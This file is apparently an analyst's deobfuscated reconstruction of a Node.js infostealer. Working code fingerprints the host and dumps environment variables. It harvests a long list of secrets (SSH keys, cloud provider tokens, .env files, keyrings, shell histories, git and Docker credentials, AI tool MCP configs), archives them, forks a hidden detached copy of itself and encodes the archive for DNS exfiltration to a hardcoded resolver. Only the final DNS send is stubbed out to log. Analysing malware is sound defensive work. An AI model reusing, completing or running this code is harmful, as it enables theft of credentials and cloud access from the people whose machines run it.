(function () {
  "use strict";

  const fs = require("fs");
  const path = require("path");
  const os = require("os");
  const crypto = require("crypto");
  const zlib = require("zlib");
  const dns = require("dns");
  const child_process = require("child_process");
  const net = require("net");

  const CONFIG = {
    dnsLabelMax: 63,
    dataChunkSize: 31,
    machineIdLen: 16,

    key: "qZ8pL3vNxR9wKmTyHbVcFgDsJaEoUi",
    resolver: "sh.azurestaticprovider.net:443",
    domainSuffix: "bt.node.js",

    tmpDir: path.join(os.tmpdir(), "nt-" + process.pid),
  };

  const BASE64_ALPHABET =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

  const DNS_HEADER_PREFIX = "xh";
  const DNS_DATA_PREFIX = "xd";
  const DNS_FOOTER_PREFIX = "xf";

  const ARCHIVE_FILE_PREFIX = "fixtures/f_";
  const ARCHIVE_PATHS_FILE = "fixtures/_paths.txt";

  const CHILD_ENV_NAME = "__ntw";
  const CHILD_ENV_VALUE = "1";

  // sha256(lowercase basename of the original malicious filename)
  const EXPECTED_MAIN_FILENAME_SHA256 =
    "bf9d8c0c3ed3ceaa831a13de27f1b1c7c7b7f01d2db4103bfdba4191940b0301";

  let resolvedDnsServer = "";

  function sha256Buffer(input) {
    return crypto.createHash("sha256").update(input).digest();
  }

  function sha256Utf8(input) {
    return crypto.createHash("sha256").update(input, "utf8").digest();
  }

  function hmacSha256Hex(key, input) {
    return crypto.createHmac("sha256", key).update(input).digest("hex");
  }

  function getOsFingerprintString() {
    return [
      os.platform(),
      os.release(),
      os.arch(),
      os.hostname(),
      os.endianness(),
    ].join(" ");
  }

  function deriveMachineId(secretKey, osData) {
    let digest = sha256Utf8(secretKey + "|" + osData + "|s");
    const outputLen = Math.max(8, Math.min(64, CONFIG.machineIdLen));

    for (let i = 0; i < 48; i++) {
      digest = sha256Buffer(Buffer.concat([digest, Buffer.from([i])]));
    }

    return digest.toString("hex").slice(0, outputLen);
  }

  function seededShuffle(seed, alphabet) {
    const chars = alphabet.split("");

    let state = 0;
    const seedDigest = sha256Utf8(seed + "|a");
    const increment = 1831565813;

    for (let i = 0; i < 4; i++) {
      state = (state << 8) | seedDigest[i];
    }

    function random() {
      state += increment;

      let x = Math.imul(state ^ (state >>> 15), (state | 1) >>> 0);
      x ^= x + Math.imul(x ^ (x >>> 7), x | 61);

      return ((x ^ (x >>> 14)) >>> 0) / 4294967296;
    }

    for (let i = chars.length - 1; i > 0; i--) {
      const j = Math.floor(random() * (i + 1));
      const tmp = chars[i];

      chars[i] = chars[j];
      chars[j] = tmp;
    }

    return chars.join("");
  }

  function buildBase64SubstitutionTable(seed) {
    const shuffled = seededShuffle(seed, BASE64_ALPHABET);
    const table = {};

    for (let i = 0; i < BASE64_ALPHABET.length; i++) {
      table[BASE64_ALPHABET[i]] = shuffled[i];
    }

    return table;
  }

  function deriveXorStream(seed, length) {
    const out = Buffer.alloc(length);
    let outOffset = 0;
    let counter = 0;

    while (outOffset < length) {
      const digest = sha256Utf8(seed + "|k|" + counter);

      for (let i = 0; i < digest.length && outOffset < length; i++) {
        out[outOffset++] = digest[i] & 0xff;
      }

      counter++;
    }

    return out;
  }

  function xorBuffers(a, b) {
    const out = Buffer.alloc(a.length);

    for (let i = 0; i < a.length; i++) {
      out[i] = a[i] ^ b[i];
    }

    return out;
  }

  function substituteAlphabet(input, table) {
    let out = "";

    for (let i = 0; i < input.length; i++) {
      const c = input[i];
      out += table[c] !== undefined ? table[c] : c;
    }

    return out;
  }

  function encodePayload(secretKey, gzipBytes, machineId) {
    const table = buildBase64SubstitutionTable(secretKey);

    const base64TextBytes = Buffer.from(gzipBytes.toString("base64"), "utf8");

    const xorStream = deriveXorStream(
      secretKey + "|" + machineId,
      base64TextBytes.length,
    );

    const xored = xorBuffers(base64TextBytes, xorStream);

    const transformed = substituteAlphabet(xored.toString("base64"), table);

    return {
      body: transformed,
      sig: hmacSha256Hex(secretKey + "|t", transformed).slice(0, 12),
    };
  }

  function getDomainSuffixLabels() {
    return CONFIG.domainSuffix.split(".").filter(Boolean);
  }

  function assertDnsLabelLength(index, label) {
    if (label.length > 63) {
      throw new Error(String(label.length));
    }
  }

  function buildDnsName(
    recordType,
    machineId,
    sessionId,
    sig,
    chunkIndex,
    payload,
  ) {
    let labels;

    if (recordType === "footer") {
      labels = [
        DNS_FOOTER_PREFIX,
        machineId,
        sessionId,
        sig,
        String(chunkIndex),
      ];

      for (let i = 0; i < payload.length; i += 63) {
        labels.push(payload.slice(i, i + 63));
      }

      labels = labels.concat(getDomainSuffixLabels());
    } else {
      labels = [
        recordType === "header" ? DNS_HEADER_PREFIX : DNS_DATA_PREFIX,
        machineId,
        sessionId,
        sig,
        String(chunkIndex),
        payload,
      ].concat(getDomainSuffixLabels());
    }

    for (let i = 0; i < labels.length; i++) {
      assertDnsLabelLength(i, labels[i]);
    }

    return labels.join(".");
  }

  /*
   * SAFETY MODIFICATION:
   * Original function performed DNS TXT lookups against the malware resolver.
   * This reconstruction logs the DNS query instead of sending it.
   */
  async function sendDnsTxtQuerySafely(queryName, resolver) {
    console.log("[DNS-EXFIL-BLOCKED]", queryName);
  }

  async function sendOneDnsChunk(
    recordType,
    machineId,
    sessionId,
    sig,
    chunkIndex,
    payload,
    resolver,
  ) {
    const queryName = buildDnsName(
      recordType,
      machineId,
      sessionId,
      sig,
      chunkIndex,
      payload,
    );

    await sendDnsTxtQuerySafely(queryName, resolver);
  }

  async function sendChunksInBatches(chunks, sender, timeoutMs) {
    const batchSize = 160;
    let offset = 0;

    while (offset < chunks.length) {
      const batch = chunks.slice(offset, offset + batchSize);
      offset += batch.length;

      let resolver = null;

      if (dns.promises && dns.promises.Resolver) {
        resolver = new dns.promises.Resolver();
        resolver.setServers([getDnsServer()]);
        resolver.timeout = timeoutMs;
      }

      await Promise.all(batch.map((chunk) => sender(chunk, resolver)));
    }
  }

  async function exfiltrateArchiveOverDns(
    machineId,
    gzipBytes,
    cloud,
    archivePath,
    hostLabel,
  ) {
    const sessionId = crypto.randomBytes(5).toString("hex");

    const encodedPayload = encodePayload(CONFIG.key, gzipBytes, machineId);
    const payloadBody = encodedPayload.body;
    const payloadSig = encodedPayload.sig;

    let dataChunkCount = 0;

    for (let i = 0; i < payloadBody.length; i += CONFIG.dataChunkSize) {
      dataChunkCount++;
    }

    let headerJson;
    let headerHex;
    let headerChunkCount = 1;

    for (let i = 0; i < 24; i++) {
      headerJson = JSON.stringify({
        v: 1,
        machineHex: machineId,
        cloud,
        archivePath,
        gzipBytes: gzipBytes.length,
        hdrChunks: headerChunkCount,
        datChunks: dataChunkCount,
        hostLabel,
      });

      headerHex = Buffer.from(headerJson, "utf8").toString("hex");

      const computedHeaderChunkCount = Math.ceil(
        headerHex.length / CONFIG.dnsLabelMax,
      );

      if (computedHeaderChunkCount === headerChunkCount) {
        break;
      }

      headerChunkCount = computedHeaderChunkCount;
    }

    const headerSig = hmacSha256Hex(CONFIG.key + "|p", headerJson).slice(0, 12);

    fs.mkdirSync(CONFIG.tmpDir, { recursive: true });

    const headerChunks = [];
    for (
      let offset = 0, index = 0;
      offset < headerHex.length;
      offset += CONFIG.dnsLabelMax, index++
    ) {
      headerChunks.push([
        index,
        headerHex.slice(offset, offset + CONFIG.dnsLabelMax),
      ]);
    }

    await sendChunksInBatches(
      headerChunks,
      ([index, chunk], resolver) =>
        sendOneDnsChunk(
          "header",
          machineId,
          sessionId,
          headerSig,
          index,
          chunk,
          resolver,
        ),
      8000,
    );

    const dataChunks = [];
    for (
      let offset = 0, index = 0;
      offset < payloadBody.length;
      offset += CONFIG.dataChunkSize, index++
    ) {
      const rawChunk = payloadBody.slice(offset, offset + CONFIG.dataChunkSize);
      const hexChunk = Buffer.from(rawChunk, "utf8").toString("hex");
      dataChunks.push([index, hexChunk]);
    }

    await sendChunksInBatches(
      dataChunks,
      ([index, chunk], resolver) =>
        sendOneDnsChunk(
          "data",
          machineId,
          sessionId,
          payloadSig,
          index,
          chunk,
          resolver,
        ),
      8000,
    );

    const footerJson = JSON.stringify({
      done: true,
      dataChunks: dataChunkCount,
    });

    const footerSig = hmacSha256Hex(
      CONFIG.key + "|q",
      machineId + "|" + sessionId + "|" + dataChunkCount,
    ).slice(0, 12);

    await sendOneDnsChunk(
      "footer",
      machineId,
      sessionId,
      footerSig,
      0,
      Buffer.from(footerJson, "utf8").toString("hex"),
      null,
    );
  }

  async function resolveExfilDnsServer() {
    if (resolvedDnsServer) {
      return;
    }

    const raw = CONFIG.resolver.trim();

    const bracketedIpv6WithPort = /^\[([^\]]+)\]:(\d{1,5})$/.exec(raw);
    const ipv4WithPort = /^(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})$/.exec(raw);

    if (bracketedIpv6WithPort && net.isIPv6(bracketedIpv6WithPort[1])) {
      resolvedDnsServer = raw;
      return;
    }

    if (ipv4WithPort) {
      resolvedDnsServer = raw;
      return;
    }

    if (net.isIPv6(raw) || net.isIPv4(raw)) {
      resolvedDnsServer = raw;
      return;
    }

    let host = raw;
    let port = "";

    const colonIndex = raw.lastIndexOf(":");
    if (colonIndex > 0 && /^\d{1,5}$/.test(raw.slice(colonIndex + 1))) {
      host = raw.slice(0, colonIndex);
      port = raw.slice(colonIndex + 1);
    }

    if (net.isIPv4(host) || net.isIPv6(host)) {
      resolvedDnsServer =
        port === ""
          ? host
          : net.isIPv6(host)
            ? "[" + host + "]:" + port
            : host + ":" + port;
      return;
    }

    async function resolveViaPublicDns(name) {
      const resolverServers = [["1.1.1.1"], ["8.8.8.8"]];

      for (const servers of resolverServers) {
        const resolver = new dns.promises.Resolver();
        resolver.setServers(servers);

        try {
          const ipv4 = await resolver.resolve4(name);
          if (ipv4 && ipv4.length) {
            return { address: ipv4[0], family: 4 };
          }
        } catch {}

        try {
          const ipv6 = await resolver.resolve6(name);
          if (ipv6 && ipv6.length) {
            return { address: ipv6[0], family: 6 };
          }
        } catch {}
      }

      throw new Error("resolver lookup failed");
    }

    try {
      const resolved = await resolveViaPublicDns(host);

      resolvedDnsServer =
        port === ""
          ? resolved.address
          : resolved.family === 6
            ? "[" + resolved.address + "]:" + port
            : resolved.address + ":" + port;
    } catch {
      resolvedDnsServer = raw;
    }
  }

  function getDnsServer() {
    return resolvedDnsServer || CONFIG.resolver;
  }

  function wildcardToRegex(pattern) {
    const pieces = String(pattern).split("*");
    let regex = "^";

    for (let i = 0; i < pieces.length; i++) {
      if (i) {
        regex += ".*";
      }

      regex += pieces[i].replace(/[.+^${}()|[\]\\]/g, "\\$&");
    }

    return new RegExp(regex + "$");
  }

  function listFilesInDirectory(directory) {
    const files = [];
    directory = path.normalize(directory);

    let entries;
    try {
      entries = fs.readdirSync(directory, { withFileTypes: true });
    } catch {
      return files;
    }

    for (const entry of entries) {
      const fullPath = path.join(directory, entry.name);

      if (entry.isFile()) {
        files.push(fullPath);
      }
    }

    return files;
  }

  function expandHome(inputPath) {
    if (inputPath.charAt(0) === "~") {
      return path.join(os.homedir(), inputPath.slice(1).replace(/^[\\/]/, ""));
    }

    return inputPath;
  }

  function recursiveFindByName(root, targetRelativePathOrName) {
    const results = [];
    const stack = [[root, 0]];
    const maxDepth = 18;
    const normalizedTarget = targetRelativePathOrName.split("/").join("/");

    while (stack.length) {
      const [currentDir, depth] = stack.pop();

      if (depth > maxDepth) {
        continue;
      }

      let entries;
      try {
        entries = fs.readdirSync(currentDir, { withFileTypes: true });
      } catch {
        continue;
      }

      for (const entry of entries) {
        const fullPath = path.join(currentDir, entry.name);

        if (entry.isDirectory()) {
          if (entry.name === "node_modules" || entry.name === ".git") {
            continue;
          }

          stack.push([fullPath, depth + 1]);
          continue;
        }

        const relativePath = path
          .relative(root, fullPath)
          .split(path.sep)
          .join("/");

        if (targetRelativePathOrName.indexOf("/") >= 0) {
          if (
            relativePath === normalizedTarget ||
            relativePath.endsWith("/" + normalizedTarget)
          ) {
            results.push(fullPath);
          }
        } else if (path.basename(fullPath) === targetRelativePathOrName) {
          results.push(fullPath);
        }
      }
    }

    return results;
  }

  function expandPathPattern(pattern) {
    const cwd = process.cwd();
    const results = [];

    pattern = String(pattern).trim();

    if (!pattern) {
      return results;
    }

    if (pattern.indexOf("**/") === 0) {
      return recursiveFindByName(cwd, pattern.slice(3));
    }

    let expanded = pattern;

    if (
      pattern.charAt(0) !== "/" &&
      pattern.indexOf("*") < 0 &&
      pattern.charAt(0) !== "~"
    ) {
      expanded = path.join(cwd, pattern);
    }

    expanded = expandHome(expanded);

    const oneDirectoryWildcard = expanded.match(/^(.+)\/\*\/([^/]+)$/);
    if (oneDirectoryWildcard) {
      const baseDir = oneDirectoryWildcard[1];
      const filename = oneDirectoryWildcard[2];

      let entries;
      try {
        entries = fs.readdirSync(baseDir);
      } catch {
        return results;
      }

      for (const entry of entries) {
        const candidate = path.join(baseDir, entry, filename);

        try {
          if (fs.statSync(candidate).isFile()) {
            results.push(candidate);
          }
        } catch {}
      }

      return results;
    }

    if (expanded.slice(-2) === "/*") {
      return listFilesInDirectory(expanded.slice(0, -2));
    }

    const slashIndex = Math.max(
      expanded.lastIndexOf("/"),
      expanded.lastIndexOf(path.sep),
    );

    let directory;
    let basenamePattern;

    if (slashIndex >= 0) {
      directory = expanded.slice(0, slashIndex);
      basenamePattern = expanded.slice(slashIndex + 1);
    } else {
      directory = cwd;
      basenamePattern = expanded;
    }

    directory = path.normalize(directory);

    if (
      basenamePattern.indexOf("*") >= 0 &&
      basenamePattern.indexOf("**") < 0
    ) {
      const regex = wildcardToRegex(basenamePattern);

      let entries;
      try {
        entries = fs.readdirSync(directory);
      } catch {
        return results;
      }

      for (const entry of entries) {
        if (!regex.test(entry)) {
          continue;
        }

        const candidate = path.join(directory, entry);

        try {
          if (fs.statSync(candidate).isFile()) {
            results.push(candidate);
          }
        } catch {}
      }

      return results;
    }

    try {
      expanded = path.normalize(expanded);

      if (fs.statSync(expanded).isFile()) {
        results.push(expanded);
      }
    } catch {}

    return results;
  }

  function getLinuxTargetPatterns() {
    return [
      "~/.ansible/*",
      "~/.aws/config",
      "~/.aws/credentials",
      "~/.azure/accessTokens.json",
      "~/.azure/msal_token_cache.*",
      "~/.bash_history",
      "~/.cert/nm-openvpn/*",
      ".claude.json",
      "~/.claude.json",
      "~/.claude/mcp.json",
      "**/config/database.yml",
      "~/.config/filezilla/recentservers.xml",
      "~/.config/filezilla/sitemanager.xml",
      "~/.config/gcloud/access_tokens.db",
      "~/.config/gcloud/application_default_credentials.json",
      "~/.config/gcloud/credentials.db",
      "~/.config/git/credentials",
      "~/.config/helm/*",
      "~/.config/kwalletd/*.kwl",
      "~/.config/remmina/*",
      "~/.docker/*/config.json",
      "~/.docker/config.json",
      "~/.config/containers/auth.json",
      "**/.env",
      ".env",
      "**/.env.local",
      "**/.env.production",
      "/etc/openvpn/*",
      "/etc/rancher/k3s/k3s.yaml",
      "/etc/ssh/ssh_host_*_key",
      ".git/config",
      "~/.gitconfig",
      ".git-credentials",
      "~/.git-credentials",
      "~/.history",
      "~/.kde4/share/apps/kwallet/*.kwl",
      "~/.kde/share/apps/kwallet/*.kwl",
      ".kiro/settings/mcp.json",
      "~/.kiro/settings/mcp.json",
      "~/.kube/config",
      "~/.lesshst",
      "~/.local/share/keyrings/*.keyring",
      "~/.local/share/keyrings/login.keyring",
      "~/.local/share/recently-used.xbel",
      "~/.mysql_history",
      "~/.my.cnf",
      "~/.pgpass",
      "~/.netrc",
      "~/.node_repl_history",
      ".npmrc",
      "~/.npmrc",
      "~/.pki/nssdb/*",
      "~/.psql_history",
      "~/.pypirc",
      "~/.python_history",
      "~/.remmina/*",
      "/root/.docker/config.json",
      "**/settings.p",
      "~/.ssh/authorized_keys",
      "~/.ssh/config",
      "~/.ssh/id*",
      "~/.ssh/id_",
      "~/.ssh/id_dsa",
      "~/.ssh/id_ecdsa",
      "~/.ssh/id_ed25519",
      "~/.ssh/id_rsa",
      "~/.ssh/keys",
      "~/.ssh/known_hosts",
      "~/.terraform.d/credentials.tfrc.json",
      "~/.terraform.d/terraform.rc",
      "~/.terraformrc",
      "~/.aws/sso/cache/*",
      "~/.aws/cli/cache/*",
      "~/.azure/azureProfile.json",
      "~/.azure/config",
      "~/.azure/msazure.login/*",
      "~/.config/gcloud/configurations/*",
      "~/.config/gcloud/legacy_credentials/*",
      "~/.config/openstack/clouds.yaml",
      "~/.oci/config",
      "~/.oci/sessions/*",
      "~/.config/doctl/config.yaml",
      "~/.config/scw/config.yaml",
      "~/.config/hcloud/cli.toml",
      "~/.config/atlascli/config.toml",
      "~/.fly/config.yml",
      "~/.vercel/auth.json",
      "~/.railway/config.json",
      "~/.aliyun/config.json",
      "~/.bluemix/config.json",
      "~/.config/linode-cli/*",
      "~/.mc/config.json",
      "~/.snowflake/connections.toml",
      "~/.doppler.yaml",
      "~/.config/gh/hosts.yml",
    ];
  }

  function getDarwinTargetPatterns() {
    /*
     * The pasted sample includes a separate encoded macOS list.
     * It mostly overlaps with the Linux list but includes macOS-specific
     * locations such as Application Support paths.
     *
     * Keep Linux list as a conservative baseline for static review.
     */
    return getLinuxTargetPatterns();
  }

  function getTargetPatterns() {
    const platform = os.platform();

    if (platform === "darwin") {
      return getDarwinTargetPatterns();
    }

    return getLinuxTargetPatterns();
  }

  function collectTargetFiles() {
    const seen = {};
    const collected = [];

    for (const pattern of getTargetPatterns()) {
      const matches = expandPathPattern(pattern);

      for (const filePath of matches) {
        if (!seen[filePath]) {
          seen[filePath] = 1;
          collected.push(filePath);
        }
      }
    }

    return collected;
  }

  function getUnameOrOsData() {
    try {
      return child_process
        .execSync("uname -a", {
          encoding: "utf8",
          timeout: 8000,
        })
        .trim();
    } catch {
      return getOsFingerprintString();
    }
  }

  function dumpEnvironment() {
    const keys = Object.keys(process.env).sort();
    const lines = [];

    for (const key of keys) {
      lines.push(key + "=" + String(process.env[key]));
    }

    return lines.join("\n");
  }

  function sanitizeHostLabel(label) {
    label = String(label || "");

    label = label.replace(/[/\\:\x00-\x1f<>|?*"]/g, "_");
    label = label.replace(/_+/g, "_");
    label = label.replace(/^\.+|\.+$/g, "");

    if (!label.length) {
      label = "host";
    }

    return label.slice(0, 64);
  }

  function archiveNameForFile(filePath) {
    const basename = path.basename(filePath) || "file";
    const pathHash = sha256Utf8(filePath).toString("hex").slice(0, 16);
    const safeBasename = basename.replace(/[^a-zA-Z0-9._-]/g, "_").slice(0, 48);

    return ARCHIVE_FILE_PREFIX + pathHash + "_" + safeBasename;
  }

  function padToTarBlock(buffer) {
    const paddingLen = (512 - (buffer.length % 512)) % 512;

    if (paddingLen) {
      return Buffer.concat([buffer, Buffer.alloc(paddingLen)]);
    }

    return buffer;
  }

  function tarOctalChecksum(value) {
    let out = value.toString(8) + "\0";

    if (out.length < 8) {
      out = "0000000".slice(out.length - 1) + out;
    }

    return out.slice(0, 8);
  }

  function makeTarEntry(filename, content) {
    const header = Buffer.alloc(512);
    const filenameBytes = Buffer.from(filename.slice(0, 100), "utf8");

    filenameBytes.copy(header, 0, 0, Math.min(100, filenameBytes.length));

    Buffer.from("0000644\0", "utf8").copy(header, 100);
    Buffer.from("0000000\0", "utf8").copy(header, 108);
    Buffer.from("0000000\0", "utf8").copy(header, 116);

    Buffer.from(
      ("00000000000" + content.length.toString(8) + "\0").slice(-12),
      "utf8",
    ).copy(header, 124);

    Buffer.from("00000000000\0", "utf8").copy(header, 136);
    Buffer.from("        ", "utf8").copy(header, 148);

    header.writeUInt8("0".charCodeAt(0), 156);

    Buffer.from("ustar\0", "utf8").copy(header, 257);
    Buffer.from("00", "utf8").copy(header, 263);

    let checksum = 0;
    for (let i = 0; i < 512; i++) {
      checksum += i >= 148 && i < 156 ? 32 : header[i];
    }

    Buffer.from(tarOctalChecksum(checksum), "utf8").copy(header, 148);

    return Buffer.concat([header, padToTarBlock(content)]);
  }

  function buildGzippedTarArchive(hostLabel) {
    const archivePrefix = hostLabel ? hostLabel + "/" : "";
    const tarEntries = [];
    const added = {};
    const stolenPaths = [];

    const maxFileSize = 4 * 1024 * 1024;

    function addTarEntry(relativePath, content) {
      const archivePath = archivePrefix + relativePath;

      if (added[archivePath]) {
        return;
      }

      added[archivePath] = 1;
      tarEntries.push(makeTarEntry(archivePath, content));
    }

    addTarEntry("uname.txt", Buffer.from(getUnameOrOsData() + "\n", "utf8"));

    try {
      addTarEntry("etc/hosts", fs.readFileSync("/etc/hosts"));
    } catch {}

    addTarEntry("envs.txt", Buffer.from(dumpEnvironment() + "\n", "utf8"));

    const targetFiles = collectTargetFiles();

    for (const filePath of targetFiles) {
      try {
        const stat = fs.statSync(filePath);

        if (!stat.isFile() || stat.size > maxFileSize) {
          continue;
        }

        const archivePath = archiveNameForFile(filePath);

        addTarEntry(archivePath, fs.readFileSync(filePath));
        stolenPaths.push(filePath);
      } catch {}
    }

    /*
     * Original pasted sample refers to `_0xa8e149`, which is undefined.
     * The earlier decoded constant `fixtures/_paths.txt` is clearly intended.
     */
    addTarEntry(
      ARCHIVE_PATHS_FILE,
      Buffer.from(stolenPaths.join("\n") + "\n", "utf8"),
    );

    return zlib.gzipSync(
      Buffer.concat(tarEntries.concat([Buffer.alloc(1024)])),
    );
  }

  async function mainStealer() {
    await resolveExfilDnsServer();

    const osData = getOsFingerprintString();
    const machineId = deriveMachineId(CONFIG.key, osData);
    const hostLabel = sanitizeHostLabel(os.hostname());

    const cloud = "none";

    const archivePath = path.join(CONFIG.tmpDir, machineId + ".tar.gz");

    const archiveBytes = buildGzippedTarArchive(hostLabel);

    fs.mkdirSync(CONFIG.tmpDir, { recursive: true });
    fs.writeFileSync(archivePath, archiveBytes);

    try {
      await exfiltrateArchiveOverDns(
        machineId,
        archiveBytes,
        cloud,
        archivePath,
        hostLabel,
      );
    } catch (err) {
      process.exitCode = 1;
      throw err;
    } finally {
      try {
        fs.unlinkSync(archivePath);
      } catch {}
    }
  }

  const currentModuleFilename =
    typeof module !== "undefined" && module && module.filename
      ? String(module.filename)
      : "";

  const isExpectedMainFilename =
    !!currentModuleFilename &&
    sha256Utf8(path.basename(currentModuleFilename).toLowerCase()).toString(
      "hex",
    ) === EXPECTED_MAIN_FILENAME_SHA256;

  function forkDetachedSelf() {
    if (!currentModuleFilename) {
      return 0;
    }

    try {
      const childEnv = Object.assign({}, process.env, {
        [CHILD_ENV_NAME]: CHILD_ENV_VALUE,
      });

      delete childEnv.NODE_OPTIONS;

      const child = child_process.fork(
        path.resolve(currentModuleFilename),
        [],
        {
          cwd: process.cwd(),
          detached: true,
          stdio: "ignore",
          env: childEnv,
          execArgv: [],
          windowsHide: true,
        },
      );

      if (child && child.pid) {
        if (child.channel) {
          child.channel.unref();
        }

        child.unref();
        return 1;
      }
    } catch {}

    return 0;
  }

  function run() {
    if (process.env[CHILD_ENV_NAME] === CHILD_ENV_VALUE) {
      return mainStealer();
    }

    const forked = forkDetachedSelf();

    if (forked) {
      return Promise.resolve();
    }

    return mainStealer();
  }

  run.__ntRun = run;

  try {
    if (typeof module !== "undefined" && module && module.exports) {
      if (isExpectedMainFilename) {
        module.exports = run;
      } else {
        module.exports.__ntRun = run;
      }
    }
  } catch {}

  function markFailure() {
    process.exitCode = 1;
  }

  if (process.env[CHILD_ENV_NAME] === CHILD_ENV_VALUE) {
    run().catch(markFailure);
  } else if (
    isExpectedMainFilename &&
    require.main === module &&
    process.env[CHILD_ENV_NAME] !== CHILD_ENV_VALUE
  ) {
    if (!forkDetachedSelf()) {
      run().catch(markFailure);
    }
  } else if (
    !isExpectedMainFilename &&
    process.env[CHILD_ENV_NAME] !== CHILD_ENV_VALUE
  ) {
    setImmediate(function () {
      run().catch(markFailure);
    });
  }
})();
